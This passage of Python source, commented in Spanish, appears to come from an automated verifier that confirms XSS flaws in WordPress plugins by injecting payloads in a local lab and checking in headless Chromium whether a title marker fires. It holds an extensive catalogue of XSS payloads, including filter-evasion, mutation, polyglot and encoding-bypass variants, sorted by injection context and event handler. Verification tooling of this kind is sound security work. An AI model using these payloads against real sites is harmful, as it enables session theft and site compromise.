        post_id = post_id[-1].strip() if post_id else ""
        if not post_id.isdigit():
            step(f"ERROR: no se pudo crear la página de test (output={post_id!r})")
            res.detail = "fallo al crear la página WordPress de test para Elementor XSS"
            res.evidence["screenshots"] = shots
            return res

        lab.wp_cli("post", "meta", "set", post_id, "_elementor_data", elementor_data, timeout=20)
        lab.wp_cli("post", "meta", "set", post_id, "_elementor_edit_mode", "builder", timeout=20)
        lab.wp_cli("post", "meta", "set", post_id, "_elementor_template_type", "wp-page", timeout=20)

        r_url = lab.wp_cli("post", "get", post_id, "--field=url", timeout=20)
        page_url = (r_url.stdout or "").strip().splitlines()
        page_url = page_url[-1].strip() if page_url else ""
        if not page_url.startswith("http"):
            page_url = f"{base_url}/?p={post_id}"

        step(f"página de test creada: id={post_id} url={page_url}")

        # --- Paso 4: cargar la página en Chromium como visitante anónimo ---
        path = page_url[len(base_url):] or f"/?p={post_id}"

        step(f"cargando {page_url} en Chromium (visitante anónimo) — buscando title='{marker}'...")
        with _XssBrowserSession() as xb:
            title, png = xb.render(
                base_url, path, "GET", {}, [],
                timeout_ms=20000, capture=True,
                wait_for_xss_title=f"binoracle-xss-{token}",
            )

        if title and title.strip() == marker:
            res.verified = True
            res.detail = (
                f"XSS CONFIRMADO: document.title cambió a '{marker}' al visitar "
                f"{page_url} — getPostMeta({xss_post_id},'xss_field')|raw retorna el "
                f"custom field crudo sin escapar (Twig autoescape='html' anulado por |raw)"
            )
            step(f"VERIFICADO: title='{title}' coincide con el marcador '{marker}'")
        else:
            res.detail = (
                f"XSS no confirmado: document.title='{title or '(vacío)'}', "
                f"esperado '{marker}' — puede que el payload esté escapado (Twig sin |raw), "
                f"el addon no esté registrado, o la versión instalada sea parcheada"
            )
            step(f"NO VERIFICADO: title='{title or '(vacío)'}'")

        if png:
            shots.append(("elementor-xss-chromium", png))
        res.evidence["screenshots"] = shots
        if boot is not None:
            res.evidence["http_captures"] = boot.http_captures
        res.evidence["page_url"] = page_url
        res.evidence["widget_type"] = widget_type
        res.evidence["xss_post_id"] = xss_post_id
        res.evidence["marker"] = marker
        return res

    except Exception as e:
        res.detail = f"error inesperado en Elementor XSS verifier: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_xss(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, xss_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
    stored_xss_view_path: str = "",
    payload_transform: str = "",
    extra_inject_params: Optional[dict] = None,
    render_context: str = "unknown",
    synth_hints: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica XSS en dos modos:

    MODO 1 — Reflected/same-response (modo por defecto, stored_xss_view_path vacío):
      Carga la respuesta del endpoint de inyeccion directamente en Chromium (sesion de
      subscriber). El payload pide cambiar document.title a un marcador aleatorio; solo se
      marca verificado si el title del navegador coincide EXACTO con ese marcador -- prueba
      de EJECUCION real de JS, no de reflexion de texto.

    MODO 2 — Stored XSS con vista separada (stored_xss_view_path != ''):
      Paso 1: subscriber envia el payload al endpoint de inyeccion (peticion HTTP normal,
              sin cargar la respuesta en el navegador).
      Paso 2: sesion de ADMIN carga stored_xss_view_path en Chromium (el panel del plugin,
              la lista de entradas, el log de comentarios, etc.) -- si el payload almacenado
              se renderiza ahi y ejecuta, el navegador cambia document.title al marcador.
      Esto cubre todos los XSS almacenados tipicos de WordPress donde el efecto solo se ve
      en la pagina del admin que muestra el contenido inyectado."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    xss_param = xss_param_hint or _pick_param(parameters, _XSS_HINTS)
    # Fallback: si ningún nombre de parámetro coincide con los hints, prueba el primero de la
    # lista — XSS puede estar en cualquier parámetro y es preferible intentarlo a fallar aquí.
    _all_params = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    if not xss_param and _all_params:
        xss_param = _all_params[0]
        step(f"[XSS] ningun param coincide con hints XSS → probando el primero: '{xss_param}'")
    if not xss_param:
        res.detail = "no se identifico el parametro donde se refleja el payload"
        res.limitations.append("la verificacion de XSS necesita saber que parametro se refleja; "
                               "afina 'parameters' en la hipotesis del LLM o pasalo a mano "
                               "(xss_param_hint)")
        return res
    # Recopilar parámetros alternativos para probar si el principal falla
    _xss_alt_params: list = [p for p in _all_params if p != xss_param][:4]

    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except Exception:
        res.available = False
        res.detail = ("Playwright no esta instalado: la verificacion de XSS necesita un "
                     "navegador real para confirmar EJECUCION, no basta ver el payload reflejado "
                     "en el HTML crudo")
        res.limitations.append("verificacion dinamica NO intentada: falta Playwright "
                               "(pip install playwright && playwright install chromium)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        # Params de activacion de hook que se envian con TODOS los intentos de inyeccion
        # (ej: wp_statistics_hit_rest=1, current_page_type=home, current_page_id=0)
        if extra_inject_params:
            # Sobreescribir valores vacios: dict.fromkeys(params, "") inicializa todos a "".
            # La condicion `k not in base_params` bloquearia TODOS los activation params
            # porque ya estan en base_params con valor "". Se sobreescriben solo los que
            # tienen valor vacio/falsy para no pisar valores explicitamente pasados por el LLM.
            base_params.update({k: v for k, v in extra_inject_params.items()
                                 if not base_params.get(k)})
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, xss_param, res, step,
            extra_nonce_pages=extra_nonce_pages)

        from urllib.parse import urlsplit
        host = urlsplit(boot.base_url).hostname or "127.0.0.1"
        cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"}
                  for c in boot.sub_sess.cookies]

        token = _token()
        marker = f"binoracle-xss-{token}"
        js = f"document.title='{marker}'"

        attempts = [
            # contexto HTML normal (el payload cae directo en el cuerpo de la pagina)
            f"<script>{js}</script>",
            f"<img src=x onerror=\"{js}\">",
            f"<svg onload=\"{js}\">",
            f"<body onload=\"{js}\">",
            f"<iframe src=\"javascript:{js}\"></iframe>",
            f"<details open ontoggle=\"{js}\">x</details>",
            f"<video><source onerror=\"{js}\"></video>",
            f"<marquee onstart=\"{js}\">x</marquee>",
            # rotura de atributo HTML (el payload cae DENTRO de value="..."/placeholder="..." etc.)
            f"\"><script>{js}</script>",
            f"'><script>{js}</script>",
            # rotura de href="..." (el URI almacenado se inyecta en el atributo href de un <a>)
            # -- necesita romper con " y ejecutar via onerror/onload, NO via <script> (innerHTML)
            f"\"><img src=x onerror=\"{js}\">",
            f"\"><svg onload=\"{js}\">",
            f"'><img src=x onerror=\"{js}\">",
            f"\" onmouseover=\"{js}\" x=\"",
            f"' onmouseover='{js}' x='",
            f"\" autofocus onfocus=\"{js}\" x=\"",
            # rotura de contexto JS-string (el payload cae dentro de un <script>var x='...'</script>
            # ya existente, no en HTML plano -- no vale cerrar con <script>, hay que cerrar la
            # cadena/el propio tag <script> primero)
            f"';{js};//", f'";{js};//',
            f"</script><script>{js}</script>",
            # contexto de URI (href/src esperando una URL, no HTML)
            f"javascript:{js}",
            # variantes de evasion de filtro (mayusculas mezcladas, sin parentesis en el nombre de
            # tag, entidades HTML, doble codificacion simple) -- para cuando el filtro busca
            # literalmente "<script" o "javascript:" en minusculas
            f"<ScRiPt>{js}</sCrIpT>",
            f"<img src=x onerror=&#34;{js}&#34;>",
            f"<svg/onload=\"{js}\">",
            f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
            # mutation XSS (mXSS) — parsers that re-serialize innerHTML can execute these
            # even when a simple text search would miss them
            f"<noscript><p title=\"</noscript><img src=x onerror='{js}'>\">",
            f"<svg><animate onbegin=\"{js}\" attributeName=x dur=1s>",
            f"<svg><set attributeName=href from='' to=\"javascript:{js}\" begin=0s>",
            f"<math><mtext></table></math><img src=x onerror=\"{js}\">",
            # DOM-sink polyglot — works in innerHTML/document.write even after tag stripping
            f"javascript:/*--></title></style></textarea></script></xmp><svg/onload=\"{js}\">",
            # hash-fragment injection — DOM XSS via location.hash → innerHTML
            f"#<img src=x onerror=\"{js}\">",
            # template-literal / ES6 context break
            f"`${{String.fromCharCode(60)}}script${{{js}}}${{String.fromCharCode(60)}}/script>",
            # srcdoc iframe — bypasses src-based CSP checks
            f"<iframe srcdoc='<script>{js}</script>'>",
        ]
        # ademas de los anteriores (rotura de contexto elegida a mano), TODAS las variantes
        # generalizables de xss_alert_identifiable.txt en PayloadsAllTheThings (cientos de
        # vectores de evasion de filtro reales -- \xNN entre tag/atributo, handlers poco
        # comunes, trucos de entidades) con su alert(NNNN) fijo sustituido por este mismo `js`.
        from .payload_kb import load_xss_payloads
        attempts += load_xss_payloads(js)

        # ── Priorización por hints del LLM (síntesis) ──────────────────────────────────────
        # Si el LLM detectó el contexto de inyección y/o el event handler exacto, construimos
        # payloads específicos a medida y los ponemos PRIMERO — esto hace que con alta
        # probabilidad el payload ganador esté en el primer batch (32 intentos) en vez de
        # potencialmente en el batch 16 de 17. Es el "razonamiento sobre payloads" vs fuerza bruta.
        if synth_hints:
            _sctx  = (synth_hints.get("xss_context") or "").lower().strip()
            _sevt  = (synth_hints.get("event_handler") or "").lower().strip()
            _senc  = (synth_hints.get("encoding_bypass") or "none").lower().strip()
            _synth_priority: list = []

            # 1. Payloads específicos del event_handler que el LLM predijo
            _EVT_PAYLOADS = {
                "onerror": [
                    f"<img src=x onerror=\"{js}\">",
                    f"\"><img src=x onerror=\"{js}\">",
                    f"'><img src=x onerror=\"{js}\">",
                    f"\"><img src=x onerror='{js}'>",
                    f"<img src=x onerror={js}>",
                    f"<video><source onerror=\"{js}\"></video>",
                    f"<audio src=x onerror=\"{js}\">",
                    f"<object data=x onerror=\"{js}\">",
                    f"<link rel=stylesheet href=x onerror=\"{js}\">",
                    f"<script src=x onerror=\"{js}\"></script>",
                ],
                "onload": [
                    f"<svg onload=\"{js}\">",
                    f"<body onload=\"{js}\">",
                    f"\"><svg onload=\"{js}\">",
                    f"<iframe onload=\"{js}\" src=x>",
                    f"<img src=x onload=\"{js}\">",
                    f"<link rel=stylesheet onload=\"{js}\" href=data:,>",
                ],
                "onmouseover": [
                    f"\" onmouseover=\"{js}\" x=\"",
                    f"' onmouseover='{js}' x='",
                    f"<a onmouseover=\"{js}\">x</a>",
                    f"\"><a onmouseover=\"{js}\">x</a>",
                    f"<div onmouseover=\"{js}\">x</div>",
                    f"\"><div onmouseover=\"{js}\">x</div>",
                ],
                "onfocus": [
                    f"\" autofocus onfocus=\"{js}\" x=\"",
                    f"' autofocus onfocus='{js}' x='",
                    f"<input autofocus onfocus=\"{js}\">",
                    f"\"><input autofocus onfocus=\"{js}\">",
                    f"<textarea autofocus onfocus=\"{js}\">",
                    f"<select autofocus onfocus=\"{js}\"><option>x</option></select>",
                ],
                "ontoggle": [
                    f"<details open ontoggle=\"{js}\">x</details>",
                    f"\"><details open ontoggle=\"{js}\">x</details>",
                    f"</p><details open ontoggle=\"{js}\">x</details>",
                ],
                "onstart": [
                    f"<marquee onstart=\"{js}\">x</marquee>",
                    f"\"><marquee onstart=\"{js}\">x</marquee>",
                ],
                "onclick": [
                    f"\" onclick=\"{js}\" x=\"",
                    f"<a href=# onclick=\"{js}\">x</a>",
                    f"\"><a href=# onclick=\"{js}\">x</a>",
                    f"<button onclick=\"{js}\">x</button>",
                    f"\"><button onclick=\"{js}\">x</button>",
                ],
                "onanimationend": [
                    f"<div style=\"animation:x 0s\" onanimationend=\"{js}\">x</div>",
                    f"\"><div style=\"animation:x 0s\" onanimationend=\"{js}\">x</div>",
                ],
                "onanimationstart": [
                    f"<div style=\"animation:x 0s\" onanimationstart=\"{js}\">x</div>",
                    f"\"><div style=\"animation:x 0s\" onanimationstart=\"{js}\">x</div>",
                ],
                "onpointerover": [
                    f"\" onpointerover=\"{js}\" x=\"",
                    f"<div onpointerover=\"{js}\">x</div>",
                    f"\"><div onpointerover=\"{js}\">x</div>",
                ],
                "onpointerenter": [
                    f"\" onpointerenter=\"{js}\" x=\"",
                    f"<div onpointerenter=\"{js}\">x</div>",
                ],
                "oninput": [
                    f"\" oninput=\"{js}\" x=\"",
                    f"<input oninput=\"{js}\" value=x autofocus>",
                    f"\"><input oninput=\"{js}\" value=x autofocus>",
                ],
                "onchange": [
                    f"\" onchange=\"{js}\" x=\"",
                    f"<input onchange=\"{js}\" value=x>",
                ],
                "ontransitionend": [
                    f"<div style=\"transition:all 0s\" ontransitionend=\"{js}\">x</div>",
                    f"\"><div style=\"transition:all 0s\" ontransitionend=\"{js}\">x</div>",
                ],
                "onscroll": [
                    f"<div style=\"overflow:auto;height:1px\" onscroll=\"{js}\">xxx</div>",
                    f"\"><div style=\"overflow:auto;height:1px\" onscroll=\"{js}\">xxx</div>",
                ],
                "onresize": [
                    f"<img onresize=\"{js}\" src=x style=\"width:100%\">",
                    f"\"><img onresize=\"{js}\" src=x style=\"width:100%\">",
                ],
                "onhashchange": [
                    f"<a href=#x onhashchange=\"{js}\">x</a>",
                ],
                "ondblclick": [
                    f"\" ondblclick=\"{js}\" x=\"",
                    f"<a ondblclick=\"{js}\">x</a>",
                ],
                "oncontextmenu": [
                    f"\" oncontextmenu=\"{js}\" x=\"",
                    f"<div oncontextmenu=\"{js}\">x</div>",
                ],
                "onkeydown": [
                    f"\" onkeydown=\"{js}\" x=\"",
                    f"<input onkeydown=\"{js}\" autofocus>",
                    f"\"><input onkeydown=\"{js}\" autofocus>",
                ],
                "onkeyup": [
                    f"\" onkeyup=\"{js}\" x=\"",
                    f"<input onkeyup=\"{js}\" autofocus>",
                ],
                "onbeforeinput": [
                    f"\" onbeforeinput=\"{js}\" x=\"",
                    f"<input onbeforeinput=\"{js}\" autofocus>",
                ],
                "onpaste": [
                    f"\" onpaste=\"{js}\" x=\"",
                    f"<input onpaste=\"{js}\">",
                ],
                "oncopy": [
                    f"\" oncopy=\"{js}\" x=\"",
                    f"<div oncopy=\"{js}\">x</div>",
                ],
                "oncut": [
                    f"\" oncut=\"{js}\" x=\"",
                    f"<input oncut=\"{js}\">",
                ],
                "onsubmit": [
                    f"<form onsubmit=\"{js}\"><input type=submit></form>",
                    f"\"><form onsubmit=\"{js}\"><input type=submit></form>",
                ],
                "oninvalid": [
                    f"<form><input required oninvalid=\"{js}\" type=submit></form>",
                    f"\"><form><input required oninvalid=\"{js}\" type=submit></form>",
                ],
            }
            if _sevt and _sevt in _EVT_PAYLOADS:
                _synth_priority.extend(_EVT_PAYLOADS[_sevt])

            # 2. Payloads específicos del contexto de inyección
            _CTX_PRIORITY = {
                "html_body": [
                    f"<script>{js}</script>",
                    f"<img src=x onerror=\"{js}\">",
                    f"<svg onload=\"{js}\">",
                    f"<details open ontoggle=\"{js}\">x</details>",
                    f"<ScRiPt>{js}</sCrIpT>",
                ],
                "attribute": [
                    f"\"><img src=x onerror=\"{js}\">",
                    f"'><img src=x onerror=\"{js}\">",
                    f"\"><svg onload=\"{js}\">",
                    f"\" onmouseover=\"{js}\" x=\"",
                    f"' onmouseover='{js}' x='",
                    f"\" autofocus onfocus=\"{js}\" x=\"",
                    f"\"><script>{js}</script>",
                    f"'><script>{js}</script>",
                ],
                "js_string": [
                    f"';{js};//",
                    f'";{js};//',
                    f"`\";{js};//",
                    f"</script><script>{js}</script>",
                    f"\\';{js};//",
                    f'\\";{js};//',
                ],
                "js_innerHTML": [
                    f"\"><img src=x onerror=\"{js}\">",
                    f"'><img src=x onerror=\"{js}\">",
                    f"\"><svg onload=\"{js}\">",
                    f"\" onmouseover=\"{js}\" x=\"",
                    f"\"><script>{js}</script>",
                ],
                "url": [
                    f"javascript:{js}",
                    f"jav&#x09;ascript:{js}",
                    f"\"><img src=x onerror=\"{js}\">",
                    f"\"><svg onload=\"{js}\">",
                ],
                "href": [
                    f"javascript:{js}",
                    f"jav&#x09;ascript:{js}",
                    f"\"><img src=x onerror=\"{js}\">",
                    f"\" onmouseover=\"{js}\" x=\"",
                ],
                "css": [
                    f"</style><script>{js}</script>",
                    f"</style><img src=x onerror=\"{js}\">",
                    f"expression({js})",
                ],
                "dom": [
                    f"<img src=x onerror=\"{js}\">",
                    f"<svg onload=\"{js}\">",
                    f"javascript:{js}",
                    f"';{js};//",
                    f'";{js};//',
                ],
            }
            for _c in [_sctx, _sctx.replace("_", " ")]:
                if _c and _c in _CTX_PRIORITY:
                    for p in _CTX_PRIORITY[_c]:
                        if p not in _synth_priority:
                            _synth_priority.append(p)
                    break

            # 3. Dedup interno de _synth_priority manteniendo orden
            _seen_sp: set = set()
            _synth_priority_dedup = []
            for _p in _synth_priority:
                if _p not in _seen_sp:
                    _seen_sp.add(_p)
                    _synth_priority_dedup.append(_p)
            _synth_priority = _synth_priority_dedup

            # 4. Variantes de encoding/bypass para todos los synth payloads (no solo los 8 primeros)
            if _synth_priority and _senc not in ("none", "", "unknown"):
                import urllib.parse as _up
                _encoded_extra = []
                for _p in _synth_priority:
                    if _senc in ("url_encode", "url-encode", "urlencode"):
                        _ep = _up.quote(_p)
                    elif _senc in ("double_encode", "double-encode"):
                        _ep = _up.quote(_up.quote(_p))
                    elif _senc in ("html_entity", "html-entity", "html_encode"):
                        _ep = (_p.replace("&", "&amp;").replace("<", "&lt;")
                                .replace(">", "&gt;").replace("\"", "&quot;")
                                .replace("'", "&#x27;"))
                    elif _senc in ("unicode", "unicode_escape"):
                        _ep = "".join(f"\\u{ord(c):04x}" if ord(c) > 127 or c in "<>\"'" else c
                                      for c in _p)
                    elif _senc in ("hex", "hex_encode"):
                        _ep = "".join(f"&#x{ord(c):x};" if c in "<>\"'/" else c for c in _p)
                    elif _senc in ("null_byte", "null-byte"):
                        _ep = _p.replace("<", "\x00<")
                    else:
                        _ep = _p
                    if _ep != _p and _ep not in _seen_sp:
                        _encoded_extra.append(_ep)
                        _seen_sp.add(_ep)
                _synth_priority = _encoded_extra + _synth_priority

            # Insertar synth_priority AL PRINCIPIO de attempts, eliminando duplicados
            if _synth_priority:
                _synth_set = set(_synth_priority)
                attempts = _synth_priority + [a for a in attempts if a not in _synth_set]

        # Si el scanner deterministico detecto el contexto de renderizado, reorganizar
        # attempts para probar primero los payloads especificos de ese contexto.
        # (Si ya hay synth_priority, el contexto estático refuerza el orden pero no lo contradice.)
        if render_context and render_context != "unknown":
            _CTX_PAYLOADS = {
                # Valor cae dentro de href="VALUE" o similar — necesita romper el atributo
                # o usar javascript: directamente como URI
                "href": [
                    f"javascript:{js}",
                    f"\"><img src=x onerror=\"{js}\">",
                    f"'><img src=x onerror=\"{js}\">",
                    f"\"><svg onload=\"{js}\">",
                    f"\" onmouseover=\"{js}\" x=\"",
                    f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
                ],
                # Valor cae en nodo de texto HTML — tags directos funcionan
                "html": [
                    f"<script>{js}</script>",
                    f"<img src=x onerror=\"{js}\">",
                    f"<svg onload=\"{js}\">",
                    f"<ScRiPt>{js}</sCrIpT>",
                    f"<details open ontoggle=\"{js}\">x</details>",
                ],
                # Valor cae dentro de un string JS existente — hay que cerrar la cadena
                "js_string": [
                    f"';{js};//",
                    f'";{js};//',
                    f"</script><script>{js}</script>",
                ],
                # Valor cae en atributo src/action/data — similar a href
                "url": [
                    f"javascript:{js}",
                    f"\"><img src=x onerror=\"{js}\">",
                    f"\"><svg onload=\"{js}\">",
                ],
                # Valor se inserta via template literal en .html()/innerHTML:
                # `<a href="${siteUrl}${value['str_url']}"...` → romper href + inyectar tag
                "js_innerHTML": [
                    f"\"><img src=x onerror=\"{js}\">",
                    f"'><img src=x onerror=\"{js}\">",
                    f"\"><svg onload=\"{js}\">",
                    f"\"><script>{js}</script>",
                    f"\" onmouseover=\"{js}\" x=\"",
                ],
            }
            _priority = _CTX_PAYLOADS.get(render_context, [])
            if _priority:
                _priority_set = set(_priority)
                _rest = [a for a in attempts if a not in _priority_set]
                # Si synth_priority ya ocupa las primeras posiciones no las desplazamos;
                # solo anteponemos los payloads del contexto estático que synth no cubrió.
                if synth_hints and _synth_priority:
                    _synth_set2 = set(_synth_priority)
                    _ctx_new = [p for p in _priority if p not in _synth_set2]
                    _rest2 = [a for a in _rest if a not in set(_ctx_new)]
                    attempts = _synth_priority + _ctx_new + _rest2
                else:
                    attempts = _priority + _rest

        found = False
        tried = []

        from urllib.parse import urlsplit as _urlsplit
        host_admin = _urlsplit(boot.base_url).hostname or "127.0.0.1"
        admin_cookies = [{"name": c.name, "value": c.value, "domain": host_admin, "path": "/"}
                         for c in boot.admin_sess.cookies] if boot.admin_sess else []

        # ── MODO 2: Stored XSS con vista separada ───────────────────────────────────────────
        if stored_xss_view_path:
            step(f"modo stored-XSS (dos pasos): inyectando via subscriber -> admin carga "
                 f"'{stored_xss_view_path}'...")
            # Estrategia de marcadores únicos por payload:
            # Cada payload lleva su propio document.title='binoracle-xss-TOKEN-{i}'.
            # Se inyectan TODOS vía HTTP (sin Chromium — rápido), luego UN SOLO render de
            # Chromium. El title resultante identifica directamente el índice del payload
            # ganador. Coste: 1 render independientemente de cuántos payloads haya.
            # (La búsqueda binaria anterior estaba rota: el DB acumula todos los payloads
            # de lotes previos, así que el render siempre veía el marcador aunque el subconjunto
            # actual no lo contuviera — falso positivo permanente a partir del primer hit.)
            import base64 as _base64
            import re as _re_xss

            _inject_headers = {}
            if "/wp-json/" in endpoint:
                _inject_headers = {"User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/120.0.0.0 Safari/537.36")}

            # Construir payloads con marcador único: sustituir el js genérico por uno indexado
            _indexed = []  # list of (original_payload, indexed_payload)
            for _i, _pv in enumerate(attempts):
                _unique_js = f"document.title='binoracle-xss-{token}-{_i}'"
                _unique_pv = _pv.replace(js, _unique_js)
                _indexed.append((_pv, _unique_pv))

            step(f"arrancando Chromium headless (modo stored-XSS, {len(_indexed)} payloads, "
                 f"estrategia marcador-unico → 1 render)...")

            # PASO 1: inyectar todos los payloads vía HTTP (sin Chromium)
            for _orig_pv, _idx_pv in _indexed:
                _ep = (_base64.b64encode(_idx_pv.encode()).decode()
                       if payload_transform == "base64" else _idx_pv)
                _pi = dict(base_params)
                _pi[xss_param] = _ep
                try:
                    boot.sub_sess.request(
                        m, boot.base_url + endpoint, timeout=20,
                        data=_pi if m != "GET" else None,
                        params=_pi if m == "GET" else None,
                        headers=_inject_headers or None)
                except Exception as _e:
                    tried.append({"payload": _orig_pv, "paso1_error": str(_e)})

            # PASO 2: UN SOLO render para ver qué payload disparó
            with _XssBrowserSession() as xb:
                _title, _ = xb.render(boot.base_url, stored_xss_view_path,
                                      "GET", {}, admin_cookies,
                                      wait_for_xss_title=f"binoracle-xss-{token}-")
                _m = _re_xss.match(
                    rf"binoracle-xss-{_re_xss.escape(token)}-(\d+)$", _title or "")
                if _m:
                    _winner_idx = int(_m.group(1))
                    _winner = attempts[_winner_idx] if _winner_idx < len(attempts) else ""
                    if _winner:
                        found = True
                        res.evidence["payload_ganador"] = _winner
                        res.evidence["stored_xss_view_path"] = stored_xss_view_path
                        tried.append({"payload": _winner, "title_tras_vista_admin": _title,
                                      "payload_index": _winner_idx})
                        step(f"VERIFICADO (stored XSS): el admin cargo '{stored_xss_view_path}' "
                             f"y el navegador ejecuto el script inyectado (payload #{_winner_idx}) "
                             f"-- document.title = '{_title}'. Payload: {_winner[:100]}")
                        _, png = xb.render(boot.base_url, stored_xss_view_path,
                                           "GET", {}, admin_cookies, capture=True)
                        if png:
                            boot.shots.append({
                                "caption_es": (
                                    f"Paso 5: Stored XSS confirmado -- el admin cargo "
                                    f"'{stored_xss_view_path}' y el navegador REAL ejecuto "
                                    f"el script inyectado en '{xss_param}' (payload "
                                    f"#{_winner_idx}), cambiando document.title al marcador."),
                                "caption_en": (
                                    f"Step 5: Stored XSS confirmed -- admin loaded "
                                    f"'{stored_xss_view_path}' and the REAL browser executed "
                                    f"the script injected via '{xss_param}' (payload "
                                    f"#{_winner_idx}), changing document.title to marker."),
                                "png_b64": png, "url": boot.base_url + stored_xss_view_path})
                        # second-pass: check if stored payload also renders on the public front page
                        # (proves impact extends beyond admin panel — attacker-visible pages)
                        try:
                            _fp = boot.sub_sess.get(boot.base_url + "/", timeout=10)
                            _fp2 = boot.sub_sess.get(boot.base_url + "/?p=1", timeout=10)
                            _winner_text = _winner[:80] if _winner else ""
                            _fp_hit = (_winner_text and
                                       (_winner_text in _fp.text or _winner_text in _fp2.text))
                            res.evidence["stored_rendered_public"] = _fp_hit
                            if _fp_hit:
                                res.evidence["stored_rendered_url"] = boot.base_url + "/"
                        except Exception:
                            pass

        # ── MODO 1: Reflected / same-response ───────────────────────────────────────────────
        if not found and not stored_xss_view_path:
            # UN SOLO navegador para los ~500+ intentos (ver _XssBrowserSession): arrancar un
            # Chromium por payload, confirmado en vivo, tarda minutos -- el coste real es el
            # arranque del propio navegador. Pantalla SOLO del intento ganador.
            step(f"arrancando Chromium headless (modo reflected, {len(attempts)} intentos)...")
            with _XssBrowserSession() as xb:
                for _xss_i, payload_value in enumerate(attempts):
                    if _xss_i > 0 and _xss_i % 100 == 0:
                        step(f"XSS reflected: {_xss_i}/{len(attempts)} payloads probados, sin hit aún...")
                    params = dict(base_params)
                    params[xss_param] = payload_value
                    title, _ = xb.render(boot.base_url, endpoint, m, params, cookies)
                    tried.append({"payload": payload_value, "title_resultante": title})
                    if title == marker:
                        found = True
                        res.evidence["payload_ganador"] = payload_value
                        step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- "
                             f"document.title cambio exactamente a '{marker}'.")
                        _, png = xb.render(boot.base_url, endpoint, m, params, cookies,
                                           capture=True)
                        if png:
                            boot.shots.append({
                                "caption_es": (f"Paso 5: XSS confirmado -- el navegador REAL ejecuto "
                                              f"el script inyectado en '{xss_param}', cambiando "
                                              f"document.title al marcador '{marker}' (no es texto "
                                              f"reflejado, es codigo JS ejecutandose)."),
                                "caption_en": (f"Step 5: XSS confirmed -- the REAL browser executed the "
                                              f"script injected in '{xss_param}', changing document.title "
                                              f"to the marker '{marker}' (not reflected text, actual JS "
                                              f"running)."),
                                "png_b64": png, "url": boot.base_url + endpoint})
                        break

        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                             "login_bajo_privilegio_password": boot.sub_pass,
                             "xss_param": xss_param, "token": token, "metodo": m,
                             "endpoint": endpoint, "intentos": tried,
                             "modo_xss": "stored-two-step" if stored_xss_view_path else "reflected"})
        if found:
            res.verified = True
            res.ok = True
            if stored_xss_view_path:
                res.detail = (f"Stored XSS confirmado (dos pasos): subscriber inyecto en "
                              f"{xss_param}, el admin cargo '{stored_xss_view_path}' y el "
                              f"navegador REAL ejecuto el script -- document.title = '{marker}', "
                              f"prueba inequivoca de XSS almacenado, no reflexion de texto")
            else:
                res.detail = (f"XSS (reflected) confirmado: el navegador real EJECUTO el script "
                              f"inyectado en {xss_param} -- document.title cambio exactamente a "
                              f"'{marker}', algo que solo el motor JS del navegador pudo hacer, "
                              f"no una coincidencia de texto reflejado")
        else:
            # Retry with alternative parameters (reflected XSS only, no stored_xss_view_path)
            if not stored_xss_view_path and _xss_alt_params and time.time() - t0 < budget_s - 120:
                _short_attempts = attempts[:12]  # only the most common payloads for alt params
                step(f"[XSS] param '{xss_param}' sin hit; probando {len(_xss_alt_params)} params alt.: {_xss_alt_params}")
                with _XssBrowserSession() as xb_alt:
                    for _alt_p in _xss_alt_params:
                        if found:
                            break
                        for payload_value in _short_attempts:
                            _ap = dict(base_params)
                            _ap[_alt_p] = payload_value
                            title, _ = xb_alt.render(boot.base_url, endpoint, m, _ap, cookies)
                            tried.append({"payload": payload_value, "xss_param_alt": _alt_p, "title_resultante": title})
                            if title == marker:
                                found = True
                                xss_param = _alt_p
                                res.evidence["payload_ganador"] = payload_value
                                res.evidence["param_alt_usado"] = _alt_p
                                step(f"VERIFICADO con param alt '{_alt_p}': document.title='{marker}'")
                                break
            res.ok = True
            if found:
                res.verified = True
                res.detail = (f"XSS (reflected) confirmado via param alt '{xss_param}': "
                              f"document.title cambio exactamente a '{marker}'")
            elif stored_xss_view_path:
                res.detail = (f"se probaron {len(tried)} payloads en modo stored-XSS (inyeccion "
                              f"via subscriber + vista del admin en '{stored_xss_view_path}') y "
                              f"en ninguno el navegador ejecuto el script -- el XSS almacenado "
                              f"no se confirmo (puede que el parametro o la ruta de vista no "
                              f"sean los reales, o que haya sanitizacion)")
            else:
                res.detail = (f"se probaron {len(tried)} variantes de XSS para {xss_param} y en "
                              f"ninguna el navegador ejecuto el script (document.title nunca cambio "
                              f"a '{marker}') -- el XSS no se confirmo (puede que el contexto de "
                              f"reflexion sea distinto, que haya sanitizacion real, o que el efecto "
                              f"solo se vea en OTRA pagina -- prueba con stored_xss_view_path)")
                try:
                    sample_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                    sample_params[xss_param] = attempts[0] if attempts else ""
                    sample_resp = boot.sub_sess.request(
                        m, boot.base_url + endpoint,
                        data=sample_params if m != "GET" else None,
                        params=sample_params if m == "GET" else None, timeout=15)
                    res.evidence["respuesta_cuerpo_recorte"] = (sample_resp.text or "")[:500]
                    _csp = (sample_resp.headers.get("Content-Security-Policy") or
